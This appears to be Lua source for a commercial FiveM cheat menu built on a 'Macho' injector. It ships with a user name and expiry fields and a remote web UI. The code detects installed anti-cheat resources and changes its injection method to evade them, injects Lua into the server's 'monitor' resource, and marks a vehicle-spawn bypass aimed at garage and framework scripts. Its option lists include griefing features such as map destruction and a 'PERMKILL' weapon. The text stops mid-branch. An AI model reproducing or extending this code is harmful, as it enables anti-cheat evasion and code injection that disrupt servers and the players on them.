local DEBUG = false
Username = "RUBEN"
ExpDate = ""
local WTPSHOP_DUI_BUILD = "20261019b"
local WTPSHOP_DUI_URL = "https://robinzxcc.github.io/wtpshop-dui/?v=" .. WTPSHOP_DUI_BUILD .. "&ingame=1"

---@diagnostic disable: undefined-global
local WTP = {}
local IsVisible = false
local DUI = nil
local HoveredIndex = 1
local ActiveMenu = {}
local CurrentMenu = ActiveMenu
local CurrentCategories = nil
local CurrentCategoryIndex = 1
local MenuStack = {}
local MenuLabelStack = {}
local LastUIState = nil
local MenuKey = "H"
local MenuOpenable = false
local MenuKeybinds = {}
local ShiftHolding = false
local CPlayers = {}
local WeaponsLabels = { [GetHashKey('weapon_unarmed')] = 'Fists', [GetHashKey('weapon_knife')] = 'Knife', [GetHashKey('weapon_nightstick')] = 'Nightstick', [GetHashKey('weapon_hammer')] = 'Hammer', [GetHashKey('weapon_bat')] = 'Baseball Bat', [GetHashKey('weapon_golfclub')] = 'Golf Club', [GetHashKey('weapon_crowbar')] = 'Crowbar', [GetHashKey('weapon_pistol')] = 'Pistol', [GetHashKey('weapon_pistol_mk2')] = 'Pistol Mk II', [GetHashKey('weapon_snspistol_mk2')] = 'SNS Pistol Mk II', [GetHashKey('weapon_ceramicpistol')] = 'Ceramic Pistol', [GetHashKey('weapon_revolver_mk2')] = 'Heavy Revolver Mk II', [GetHashKey('weapon_doubleaction')] = 'Double-Action Revolver', [GetHashKey('weapon_gadgetpistol')] = 'Gadget Pistol', [GetHashKey('weapon_pistolxm3')] = 'WM 29 Pistol', [GetHashKey('weapon_combatpistol')] = 'Combat Pistol', [GetHashKey('weapon_appistol')] = 'AP Pistol', [GetHashKey('weapon_pistol50')] = 'Pistol .50', [GetHashKey('weapon_microsmg')] = 'Micro SMG', [GetHashKey('weapon_smg')] = 'SMG', [GetHashKey('weapon_assaultsmg')] = 'Assault SMG', [GetHashKey('weapon_assaultrifle')] = 'Assault Rifle', [GetHashKey('weapon_assaultrifle_mk2')] = 'Assault Rifle Mk II', [GetHashKey('weapon_specialcarbine_mk2')] = 'Special Carbine Mk II', [GetHashKey('weapon_bullpuprifle_mk2')] = 'Bullpup Rifle Mk II', [GetHashKey('weapon_militaryrifle')] = 'Military Rifle', [GetHashKey('weapon_tacticalrifle')] = 'Service Carbine', [GetHashKey('weapon_battlerifle')] = 'Battle Rifle', [GetHashKey('weapon_carbinerifle')] = 'Carbine Rifle', [GetHashKey('weapon_advancedrifle')] = 'Advanced Rifle', [GetHashKey('weapon_mg')] = 'MG', [GetHashKey('weapon_combatmg')] = 'Combat MG', [GetHashKey('weapon_pumpshotgun')] = 'Pump Shotgun', [GetHashKey('weapon_sawnoffshotgun')] = 'Sawed-Off Shotgun', [GetHashKey('weapon_assaultshotgun')] = 'Assault Shotgun', [GetHashKey('weapon_bullpupshotgun')] = 'Bullpup Shotgun', [GetHashKey('weapon_hackingdevice')] = 'Hacking Device', [GetHashKey('weapon_stungun')] = 'Stun Gun', [GetHashKey('weapon_stungun_mp')] = 'Stun Gun MP', [GetHashKey('weapon_sniperrifle')] = 'Sniper Rifle', [GetHashKey('weapon_heavysniper')] = 'Heavy Sniper', [GetHashKey('weapon_grenadelauncher')] = 'Grenade Launcher', [GetHashKey('weapon_rpg')] = 'RPG', [GetHashKey('weapon_minigun')] = 'Minigun', [GetHashKey('weapon_grenade')] = 'Grenade', [GetHashKey('weapon_stickybomb')] = 'Sticky Bomb', [GetHashKey('weapon_smokegrenade')] = 'Smoke Grenade', [GetHashKey('weapon_bzgas')] = 'BZ Gas', [GetHashKey('weapon_molotov')] = 'Molotov Cocktail', [GetHashKey('weapon_fireextinguisher')] = 'Fire Extinguisher', [GetHashKey('weapon_petrolcan')] = 'Jerry Can', [GetHashKey('weapon_ball')] = 'Baseball', [GetHashKey('weapon_snspistol')] = 'SNS Pistol', [GetHashKey('weapon_bottle')] = 'Broken Bottle', [GetHashKey('weapon_gusenberg')] = 'Gusenberg Sweeper', [GetHashKey('weapon_specialcarbine')] = 'Special Carbine', [GetHashKey('weapon_heavypistol')] = 'Heavy Pistol', [GetHashKey('weapon_bullpuprifle')] = 'Bullpup Rifle', [GetHashKey('weapon_dagger')] = 'Dagger', [GetHashKey('weapon_vintagepistol')] = 'Vintage Pistol', [GetHashKey('weapon_firework')] = 'Firework Launcher', [GetHashKey('weapon_musket')] = 'Musket', [GetHashKey('weapon_heavyshotgun')] = 'Heavy Shotgun', [GetHashKey('weapon_marksmanrifle')] = 'Marksman Rifle', [GetHashKey('weapon_hominglauncher')] = 'Homing Launcher', [GetHashKey('weapon_proxmine')] = 'Proximity Mines', [GetHashKey('weapon_snowball')] = 'Snowball', [GetHashKey('weapon_flaregun')] = 'Flare Gun', [GetHashKey('weapon_garbagebag')] = 'Garbage Bag', [GetHashKey('weapon_handcuffs')] = 'Handcuffs', [GetHashKey('weapon_combatpdw')] = 'Combat PDW', [GetHashKey('weapon_marksmanpistol')] = 'Marksman Pistol', [GetHashKey('weapon_knuckle')] = 'Knuckle Dusters', [GetHashKey('weapon_hatchet')] = 'Hatchet', [GetHashKey('weapon_railgun')] = 'Railgun', [GetHashKey('weapon_machinepistol')] = 'Machine Pistol', [GetHashKey('weapon_switchblade')] = 'Switchblade', [GetHashKey('weapon_revolver')] = 'Heavy Revolver', [GetHashKey('weapon_heavyrifle')] = 'Heavy Rifle', [GetHashKey('weapon_dbshotgun')] = 'Double Barrel Shotgun', [GetHashKey('weapon_compactrifle')] = 'Compact Rifle', [GetHashKey('weapon_battleaxe')] = 'Battle Axe', [GetHashKey('weapon_compactlauncher')] = 'Compact Grenade Launcher', [GetHashKey('weapon_minismg')] = 'Mini SMG', [GetHashKey('weapon_pipebomb')] = 'Pipe Bomb', [GetHashKey('weapon_poolcue')] = 'Pool Cue', [GetHashKey('weapon_wrench')] = 'Wrench', [GetHashKey('weapon_autoshotgun')] = 'Sweeper Shotgun', [GetHashKey('weapon_bread')] = 'Piece of Bread', [GetHashKey('weapon_stone_hatchet')] = 'Stone Hatchet', [GetHashKey('weapon_rayminigun')] = 'Unholy Hellbringer', [GetHashKey('weapon_raycarbine')] = 'Widowmaker', [GetHashKey('weapon_compactgrenadelauncher')] = 'Compact Grenade Launcher', [GetHashKey('weapon_smugglerpistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_raypistol')] = 'Up-n-Atomizer', [GetHashKey('weapon_perico_pistol')] = 'Ceramic Pistol', [GetHashKey('weapon_carbinerifle_mk2')] = 'Carbine Rifle Mk II', [GetHashKey('weapon_combatmg_mk2')] = 'Combat MG Mk II', [GetHashKey('weapon_heavysniper_mk2')] = 'Heavy Sniper Mk II', [GetHashKey('weapon_marksmanrifle_mk2')] = 'Marksman Rifle Mk II', [GetHashKey('weapon_pumpshotgun_mk2')] = 'Pump Shotgun Mk II', [GetHashKey('weapon_smg_mk2')] = 'SMG Mk II', [GetHashKey('weapon_raycarbine_mk2')] = 'Widowmaker Mk II', [GetHashKey('weapon_machete')] = 'Machete', [GetHashKey('weapon_flashlight')] = 'Flashlight', [GetHashKey('weapon_hazardousknife')] = 'Hazardous Knife', [GetHashKey('weapon_navyrevolver')] = 'Navy Revolver', [GetHashKey('weapon_golfball')] = 'Golf Ball' }
local FreecamEnabled = false
local LastWeaponFired = nil
local CurrentWeaponIndex = 1
local CurrentVehicleIndex = 1
local CurrentMapDestroyerIndex = 1
local CurrentSpawnObjectIndex = 1
local FreecamWeaponList = { "WEAPON_APPISTOL", "WEAPON_PISTOL", "WEAPON_SMG", "WEAPON_ASSAULTRIFLE", "WEAPON_RPG", "WEAPON_PERMKILL", "WEAPON_AIRSTRIKE_ROCKET" }
local FreecamVehicleList = { "Adder", "Zentorno", "Comet", "Banshee", "Trash", "Dump" }
local FreecamMapDestroyerList = { "City", "Docks", "Playa Vista", "Mountain", "Pink Cage", "Vespucci", "Mega Mall", "Platform", "Big Ring", "Tube", "Dessert", "Goal", "Big Statue 2", "House" }
local FreecamSpawnObjectList = { "Big Tires", "Dome", "Black Surface", "Spinning Object", "Arena Fire", "Landmine", "Big Wheels", "Cnt Arena", "Arena Skull", "Arena Bomb", "Waste Rims" }
local FreecamOptions = { "Default", "Teleport", "Shoot Weapon", "Shoot Vehicle", "Map Destroyer", "Spawn Object", "Helicopter Attack" }
local FreecamHoveredIndex = 1
local fgawjFmaDjdALaO = false -- Super Strength
local fovEnabled = false
local fovShow = false
local fovRadius = 100
local MappedKeys = {
    [27] = "Escape", [112] = "F1", [113] = "F2",
    [114] = "F3", [115] = "F4", [116] = "F5",
    [117] = "F6", [118] = "F7", [119] = "F8",
    [120] = "F9", [121] = "F10", [122] = "F11",
    [123] = "F12", [192] = "`",
    [49] = "1", [50] = "2", [51] = "3",
    [52] = "4", [53] = "5", [54] = "6",
    [55] = "7", [56] = "8", [57] = "9",
    [48] = "0", [189] = "-", [187] = "=",
    [8] = "Backspace", [9] = "Tab", [81] = "Q",
    [87] = "W", [69] = "E", [82] = "R",
    [84] = "T", [89] = "Y", [85] = "U",
    [73] = "I", [79] = "O", [80] = "P",
    [219] = "[", [221] = "]", [220] = "\\",
    [20] = "CapsLock", [65] = "A", [83] = "S",
    [68] = "D", [70] = "F", [71] = "G",
    [72] = "H", [74] = "J", [75] = "K",
    [76] = "L", [186] = ";", [222] = "'",
    [13] = "Enter", [16] = "Shift", [90] = "Z",
    [88] = "X", [67] = "C", [86] = "V",
    [66] = "B", [78] = "N", [77] = "M",
    [188] = ",", [190] = ".", [191] = "/",
    [17] = "Control", [46] = "Delete", [33] = "PageUp",
    [34] = "PageDown", [35] = "End", [36] = "Home",
    [38] = "ArrowUp", [40] = "ArrowDown", [37] = "ArrowLeft", [39] = "ArrowRight"
}

local VK_TO_FIVEM = {
    [27] = 322,    -- Escape
    [112] = 288,   -- F1
    [113] = 289,   -- F2
    [114] = 170,   -- F3
    [115] = 167,   -- F4
    [116] = 166,   -- F5
    [117] = 167,   -- F6
    [118] = 168,   -- F7
    [119] = 169,   -- F8
    [120] = 56,    -- F9
    [121] = 57,    -- F10
    [122] = 344,   -- F11
    [123] = 345,   -- F12
    [192] = 243,   -- `
    [49] = 157,    -- 1
    [50] = 158,    -- 2
    [51] = 160,    -- 3
    [52] = 164,    -- 4
    [53] = 165,    -- 5
    [54] = 159,    -- 6
    [55] = 161,    -- 7
    [56] = 162,    -- 8
    [57] = 163,    -- 9
    [48] = 82,     -- 0
    [189] = 84,    -- -
    [187] = 83,    -- =
    [8] = 177,     -- Backspace
    [9] = 37,      -- Tab
    [81] = 44,     -- Q
    [87] = 32,     -- W
    [69] = 46,     -- E
    [82] = 45,     -- R
    [84] = 245,    -- T
    [89] = 246,    -- Y
    [85] = 303,    -- U
    [73] = 74,     -- I
    [79] = 199,    -- O
    [80] = 7,      -- P
    [219] = 39,    -- [
    [221] = 40,    -- ]
    [220] = 36,    -- \
    [20] = 137,    -- CapsLock
    [65] = 34,     -- A
    [83] = 33,     -- S
    [68] = 30,     -- D
    [70] = 49,     -- F
    [71] = 47,     -- G
    [72] = 74,     -- H
    [74] = 311,    -- J
    [75] = 311,    -- K
    [76] = 7,      -- L
    [186] = 81,    -- ;
    [222] = 82,    -- '
    [13] = 18,     -- Enter
    [16] = 21,     -- Shift
    [90] = 20,     -- Z
    [88] = 73,     -- X
    [67] = 26,     -- C
    [86] = 0,      -- V
    [66] = 29,     -- B
    [78] = 249,    -- N
    [77] = 244,    -- M
    [188] = 82,    -- ,
    [190] = 81,    -- .
    [191] = 83,    -- /
    [17] = 36,     -- Control
    [46] = 178,    -- Delete
    [33] = 10,     -- PageUp
    [34] = 11,     -- PageDown
    [35] = 213,    -- End
    [36] = 213,    -- Home
    [38] = 27,     -- ArrowUp
    [40] = 173,    -- ArrowDown
    [37] = 174,    -- ArrowLeft
    [39] = 175     -- ArrowRight
}


local WeaponList = {
    -- Melee
    ["weapon_unarmed"] = {label = "Unarmed", hash = GetHashKey("weapon_unarmed")},
    ["weapon_knife"] = {label = "Knife", hash = GetHashKey("weapon_knife")},
    ["weapon_dagger"] = {label = "Dagger", hash = GetHashKey("weapon_dagger")},
    ["weapon_bat"] = {label = "Baseball Bat", hash = GetHashKey("weapon_bat")},
    ["weapon_bottle"] = {label = "Broken Bottle", hash = GetHashKey("weapon_bottle")},
    ["weapon_crowbar"] = {label = "Crowbar", hash = GetHashKey("weapon_crowbar")},
    ["weapon_golfclub"] = {label = "Golf Club", hash = GetHashKey("weapon_golfclub")},
    ["weapon_hammer"] = {label = "Hammer", hash = GetHashKey("weapon_hammer")},
    ["weapon_hatchet"] = {label = "Hatchet", hash = GetHashKey("weapon_hatchet")},
    ["weapon_machete"] = {label = "Machete", hash = GetHashKey("weapon_machete")},
    ["weapon_switchblade"] = {label = "Switchblade", hash = GetHashKey("weapon_switchblade")},
    ["weapon_nightstick"] = {label = "Nightstick", hash = GetHashKey("weapon_nightstick")},
    ["weapon_wrench"] = {label = "Wrench", hash = GetHashKey("weapon_wrench")},

    -- Handguns
    ["weapon_pistol"] = {label = "Pistol", hash = GetHashKey("weapon_pistol")},
    ["weapon_pistol_mk2"] = {label = "Pistol Mk II", hash = GetHashKey("weapon_pistol_mk2")},
    ["weapon_combatpistol"] = {label = "Combat Pistol", hash = GetHashKey("weapon_combatpistol")},
    ["weapon_appistol"] = {label = "AP Pistol", hash = GetHashKey("weapon_appistol")},
    ["weapon_stungun"] = {label = "Taser", hash = GetHashKey("weapon_stungun")},
    ["weapon_pistol50"] = {label = "Pistol .50", hash = GetHashKey("weapon_pistol50")},
    ["weapon_snspistol"] = {label = "SNS Pistol", hash = GetHashKey("weapon_snspistol")},
    ["weapon_heavypistol"] = {label = "Heavy Pistol", hash = GetHashKey("weapon_heavypistol")},
    ["weapon_vintagepistol"] = {label = "Vintage Pistol", hash = GetHashKey("weapon_vintagepistol")},
    ["weapon_flaregun"] = {label = "Flare Gun", hash = GetHashKey("weapon_flaregun")},

    -- SMGs
    ["weapon_microsmg"] = {label = "Micro SMG", hash = GetHashKey("weapon_microsmg")},
    ["weapon_smg"] = {label = "SMG", hash = GetHashKey("weapon_smg")},
    ["weapon_smg_mk2"] = {label = "SMG Mk II", hash = GetHashKey("weapon_smg_mk2")},
    ["weapon_assaultsmg"] = {label = "Assault SMG", hash = GetHashKey("weapon_assaultsmg")},
    ["weapon_machinepistol"] = {label = "Machine Pistol", hash = GetHashKey("weapon_machinepistol")},
    ["weapon_minismg"] = {label = "Mini SMG", hash = GetHashKey("weapon_minismg")},
    ["weapon_combatpdw"] = {label = "Combat PDW", hash = GetHashKey("weapon_combatpdw")},

    -- Rifles
    ["weapon_assaultrifle"] = {label = "Assault Rifle", hash = GetHashKey("weapon_assaultrifle")},
    ["weapon_assaultrifle_mk2"] = {label = "Assault Rifle Mk II", hash = GetHashKey("weapon_assaultrifle_mk2")},
    ["weapon_carbinerifle"] = {label = "Carbine Rifle", hash = GetHashKey("weapon_carbinerifle")},
    ["weapon_carbinerifle_mk2"] = {label = "Carbine Rifle Mk II", hash = GetHashKey("weapon_carbinerifle_mk2")},
    ["weapon_advancedrifle"] = {label = "Advanced Rifle", hash = GetHashKey("weapon_advancedrifle")},
    ["weapon_specialcarbine"] = {label = "Special Carbine", hash = GetHashKey("weapon_specialcarbine")},
    ["weapon_bullpuprifle"] = {label = "Bullpup Rifle", hash = GetHashKey("weapon_bullpuprifle")},
    ["weapon_bullpuprifle_mk2"] = {label = "Bullpup Rifle Mk II", hash = GetHashKey("weapon_bullpuprifle_mk2")},
    ["weapon_compactrifle"] = {label = "Compact Rifle", hash = GetHashKey("weapon_compactrifle")},
    ["weapon_marksmanrifle"] = {label = "Marksman Rifle", hash = GetHashKey("weapon_marksmanrifle")},

    -- Shotguns
    ["weapon_pumpshotgun"] = {label = "Pump Shotgun", hash = GetHashKey("weapon_pumpshotgun")},
    ["weapon_pumpshotgun_mk2"] = {label = "Pump Shotgun Mk II", hash = GetHashKey("weapon_pumpshotgun_mk2")},
    ["weapon_sawnoffshotgun"] = {label = "Sawed-Off Shotgun", hash = GetHashKey("weapon_sawnoffshotgun")},
    ["weapon_assaultshotgun"] = {label = "Assault Shotgun", hash = GetHashKey("weapon_assaultshotgun")},
    ["weapon_bullpupshotgun"] = {label = "Bullpup Shotgun", hash = GetHashKey("weapon_bullpupshotgun")},
    ["weapon_heavyshotgun"] = {label = "Heavy Shotgun", hash = GetHashKey("weapon_heavyshotgun")},
    ["weapon_autoshotgun"] = {label = "Auto Shotgun", hash = GetHashKey("weapon_autoshotgun")},

    -- Snipers
    ["weapon_sniperrifle"] = {label = "Sniper Rifle", hash = GetHashKey("weapon_sniperrifle")},
    ["weapon_heavysniper"] = {label = "Heavy Sniper", hash = GetHashKey("weapon_heavysniper")},
    ["weapon_heavysniper_mk2"] = {label = "Heavy Sniper Mk II", hash = GetHashKey("weapon_heavysniper_mk2")},
    ["weapon_marksmanrifle_mk2"] = {label = "Marksman Rifle Mk II", hash = GetHashKey("weapon_marksmanrifle_mk2")},

    -- Explosives / Launchers
    ["weapon_grenade"] = {label = "Grenade", hash = GetHashKey("weapon_grenade")},
    ["weapon_stickybomb"] = {label = "Sticky Bomb", hash = GetHashKey("weapon_stickybomb")},
    ["weapon_molotov"] = {label = "Molotov Cocktail", hash = GetHashKey("weapon_molotov")},
    ["weapon_pipebomb"] = {label = "Pipe Bomb", hash = GetHashKey("weapon_pipebomb")},
    ["weapon_proxmine"] = {label = "Proximity Mine", hash = GetHashKey("weapon_proxmine")},
    ["weapon_rpg"] = {label = "RPG", hash = GetHashKey("weapon_rpg")},
    ["weapon_grenadelauncher"] = {label = "Grenade Launcher", hash = GetHashKey("weapon_grenadelauncher")},
    ["weapon_hominglauncher"] = {label = "Homing Launcher", hash = GetHashKey("weapon_hominglauncher")},
    ["weapon_minigun"] = {label = "Minigun", hash = GetHashKey("weapon_minigun")},
    ["weapon_railgun"] = {label = "Railgun", hash = GetHashKey("weapon_railgun")},

    -- Throwables / Misc
    ["weapon_ball"] = {label = "Baseball", hash = GetHashKey("weapon_ball")},
    ["weapon_smokegrenade"] = {label = "Smoke Grenade", hash = GetHashKey("weapon_smokegrenade")},
    ["weapon_flare"] = {label = "Flare", hash = GetHashKey("weapon_flare")},
    ["weapon_petrolcan"] = {label = "Jerry Can", hash = GetHashKey("weapon_petrolcan")},
    ["weapon_bzgas"] = {label = "BZ Gas", hash = GetHashKey("weapon_bzgas")}
}

local InjectionType = GetResourceState("WaveShield") == "started" and "Raw" or "Default" -- MachoInjectResource | MachoInjectResourceRaw
local Injection = InjectionType == "Raw" and MachoInjectResourceRaw or MachoInjectResource

-- Spawn Vehicle Bypass
local targetRes = (GetResourceState("lunar_fishing") == "started" and "lunar_fishing") or (GetResourceState("jg-advancedgarages") == "started" and "jg-advancedgarages") or (GetResourceState("jg-dealerships") == "started" and "jg-dealerships") or (GetResourceState("cd_garage") == "started" and "cd_garage") or (GetResourceState("cfx-bg-garages") == "started" and "cfx-bg-garages") or (GetResourceState("es_extended") == "started" and "es_extended") or "any"
local targetSafeRes = (GetResourceState("es_extended") == "started" and "es_extended") or (GetResourceState("ox_lib") == "started" and "ox_lib") or "any"

-- Detections
local IsDetections = GetResourceState("seph") == 'started' or GetResourceState("sxph_idsystem") == 'started'

---@param text string
function WTP:Debug(color, text)
    local debugColors = { ["red"] = "^1", ["yellow"] = "^3", ["green"] = "^2", ["info"] = "^5" }
    local debugColor = debugColors[color] or "^5"
    -- print(("^7[^5WTP^7]: [%sDEBUG^7] >> %s"):format(debugColor, text))
end

---@param data table
function WTP:SendMessage(data)
    if not DUI or not data or type(data) ~= "table" then
        return
    end

    MachoSendDuiMessage(DUI, json.encode(data))
end

---@param type "success"|"error"|"info"
---@param title string
---@param desc string
---@param duration number
function WTP:Notify(type, title, desc, duration)
    self:SendMessage({ action = "showNotification", type = type, title = title, desc = desc, duration = duration })
end

function WTP:GetMenuPath()
    local path = {}

    for i = 1, #MenuLabelStack do
        table.insert(path, MenuLabelStack[i])
    end

    return path
end

---@param elements table
function WTP:UpdateElements(elements)
    if not elements or type(elements) ~= "table" then
        return
    end

    local payload = {
        action = "updateElements",
        elements = elements,
        index = HoveredIndex - 1,
        path = self:GetMenuPath()
    }

    if CurrentCategories and type(CurrentCategories) == "table" and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = (CurrentCategoryIndex or 1) - 1
    end

    self:SendMessage(payload)
end

function WTP:Initialize()
    DUI = MachoCreateDui(WTPSHOP_DUI_URL)
    if DUI then
        self:Debug("yellow", "Creating & Initializing DUI...")
        MachoShowDui(DUI)
        self:Debug("green", "DUI Created & Initialized Successfully!")
        self:SendMessage({ action = "showUI", visible = false, index = 0 })
        self:SendMessage({ action = "displayBinds", visible = false })
        self:SendMessage({ action = "displaySpectators", visible = false })
    else
        self:Debug("red", "Failed to Create DUI")
    end
end

function WTP:HideUI(keepState)
    if keepState then
        LastUIState = {
            currentMenu = CurrentMenu,
            hoveredIndex = HoveredIndex,
            menuStack = MenuStack,
            menuLabelStack = MenuLabelStack,
            currentCategories = CurrentCategories,
            currentCategoryIndex = CurrentCategoryIndex
        }
    else
        LastUIState = nil
    end

    IsVisible = false
    self:SendMessage({ action = "keydown", index = 0 })
    self:SendMessage({ action = "showUI", visible = false, index = 0 })
end

function WTP:ShowUI()
    IsVisible = true

    if LastUIState then
        CurrentMenu = LastUIState.currentMenu
        HoveredIndex = LastUIState.hoveredIndex
        MenuStack = LastUIState.menuStack
        MenuLabelStack = LastUIState.menuLabelStack
        CurrentCategories = LastUIState.currentCategories
        CurrentCategoryIndex = LastUIState.currentCategoryIndex
        LastUIState = nil
    else
        HoveredIndex = 1
        CurrentMenu = ActiveMenu
        CurrentCategories = nil
        CurrentCategoryIndex = 1
        MenuStack = {}
        MenuLabelStack = {}
    end

    local payload = {
        action = "showUI",
        visible = true,
        elements = CurrentMenu,
        index = HoveredIndex - 1,
        path = self:GetMenuPath(),
        username = Username or "WTPBypass",
        expiration = ExpDate or "N/A"
    }

    if CurrentCategories and #CurrentCategories > 0 then
        payload.categories = CurrentCategories
        payload.categoryIndex = CurrentCategoryIndex - 1
    end

    self:SendMessage(payload)
end

function WTP:IsShiftHeld()
    return ShiftHolding
end

MachoOnKeyDown(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = true
    end
end)

MachoOnKeyUp(function(vk)
    if vk == 0x10 or vk == 0xA0 or vk == 0xA1 then
        ShiftHolding = false
    end
end)

local CurrentKeyboardInput = nil

local function KeyboardInput(Title, Value, OnConfirm, InputType)
    if CurrentKeyboardInput then return end

    CurrentKeyboardInput = {
        title = Title,
        buffer = Value or "",
        maxLength = 32,
        onConfirm = OnConfirm,
        type = InputType or "typeable",
        closeable = InputType == "keybind" and false or true,
        active = true
    }

    MachoSendDuiMessage(DUI, json.encode({
        action = "updateKeyboard",
        visible = true,
        title = Title,
        value = CurrentKeyboardInput.buffer
    }))

    if GetResourceState("rryban_secure") == "started" then
        -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("Eminence") == "started" then
        -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("AegisX") == "started" then
        -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("cfx-praryo-kernel") == "started" then
        -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("amari-utils") == "started" then
        -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    elseif GetResourceState("VynxAC") == "started" then
        -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    else
        MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
    end
    -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])

    Wait(250)
    WTP:HideUI(true)
    MenuOpenable = false
end


MachoOnKeyDown(function(vk)
    if not CurrentKeyboardInput or not CurrentKeyboardInput.active then return end

    if vk == 0x0D then -- Enter
        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        if CurrentKeyboardInput.onConfirm then
            CurrentKeyboardInput.onConfirm(CurrentKeyboardInput.buffer)
        end

        if GetResourceState("rryban_secure") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("Eminence") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("AegisX") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("cfx-praryo-kernel") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("amari-utils") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("VynxAC") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        else
            MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        end
    
        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    elseif vk == 0x08 then -- Backspace
        if CurrentKeyboardInput.type == "typeable" then
            CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer:sub(1, -2)
        else
            CurrentKeyboardInput.buffer = ""
        end
    elseif vk == 0x1B then -- Escape
        if not CurrentKeyboardInput.closeable then
            return
        end

        if GetResourceState("rryban_secure") == "started" then
           -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("Eminence") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("AegisX") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("cfx-praryo-kernel") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("amari-utils") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        elseif GetResourceState("VynxAC") == "started" then
            -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        else
            MachoInjectResourceRaw("monitor", [[ SetNuiFocus(false, false) sendMenuMessage('setGameName') ]])
        end

        CurrentKeyboardInput.active = false
        MachoSendDuiMessage(DUI, json.encode({ action = "updateKeyboard", visible = false }))
        CurrentKeyboardInput = nil
        MenuOpenable = true
        return
    else
        if CurrentKeyboardInput.type == "keybind" then
            local keyName = MappedKeys[vk]
            if keyName then
                if CurrentKeyboardInput.buffer ~= keyName then
                    CurrentKeyboardInput.buffer = keyName
                end
            end
        elseif CurrentKeyboardInput.type == "typeable" then
            local AllowedChars = {
                [0x30] = "0", [0x31] = "1", [0x32] = "2", [0x33] = "3", [0x34] = "4",
                [0x35] = "5", [0x36] = "6", [0x37] = "7", [0x38] = "8", [0x39] = "9",
                [0x41] = "A", [0x42] = "B", [0x43] = "C", [0x44] = "D", [0x45] = "E",
                [0x46] = "F", [0x47] = "G", [0x48] = "H", [0x49] = "I", [0x4A] = "J",
                [0x4B] = "K", [0x4C] = "L", [0x4D] = "M", [0x4E] = "N", [0x4F] = "O",
                [0x50] = "P", [0x51] = "Q", [0x52] = "R", [0x53] = "S", [0x54] = "T",
                [0x55] = "U", [0x56] = "V", [0x57] = "W", [0x58] = "X", [0x59] = "Y",
                [0x5A] = "Z", [0xBD] = "-", [0xBB] = "=", [0xBC] = ",", [0xBE] = ".",
                [0xBA] = ";", [0xDE] = "'", [0xBF] = "/", [0xC0] = "`", [0x20] = " "
            }

            local char = AllowedChars[vk]
            if char and #CurrentKeyboardInput.buffer < CurrentKeyboardInput.maxLength then
                if WTP:IsShiftHeld() then
                    if char:match("%a") then
                        char = char:upper()
                    elseif char == "-" then
                        char = "_"
                    end
                else
                    if char:match("%a") then
                        char = char:lower()
                    end
                end

                CurrentKeyboardInput.buffer = CurrentKeyboardInput.buffer .. char
            end
        end
    end

    if CurrentKeyboardInput then
        MachoSendDuiMessage(DUI, json.encode({
            action = "updateKeyboard",
            visible = true,
            title = CurrentKeyboardInput.title,
            value = CurrentKeyboardInput.buffer
        }))
    end
end)

CreateThread(function()
    while true do
        Wait(0)

        if CurrentKeyboardInput ~= nil then
            if GetResourceState("rryban_secure") == "started" then
                -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
            elseif GetResourceState("Eminence") == "started" then
                -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
            elseif GetResourceState("AegisX") == "started" then
                -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
            elseif GetResourceState("cfx-praryo-kernel") == "started" then
                -- MachoInjectResourceRaw("monitor", [[ SetNuiFocus(true, false) sendMenuMessage('setDebugMode') ]])
            elseif GetResourceState("amari-utils") == "started" then
